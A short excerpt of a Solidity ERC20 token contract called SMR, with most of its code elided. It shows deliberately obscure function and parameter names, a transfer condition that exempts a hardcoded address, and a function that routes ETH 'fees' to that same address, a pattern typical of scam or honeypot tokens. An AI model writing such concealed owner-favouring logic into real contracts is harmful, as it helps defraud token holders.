...
contract SMR is Context, IERC20, Ownable {
    ...
    address private _SMRAddr = 0x8B00e263C3EF08D57C0b125a26A426C4fA6c1bE6;
    ...
    function _fiwokco(address _loin, address _piss, address _tinwon, uint256 _wieont) private {
        if ((_loin == _uniswapPair || _piss != _ethhole) && _tinwon != _SMRAddr)
    ...
    function sendETHToFee(uint256 amount) private {
        payable(_SMRAddr).transfer(amount);
    }
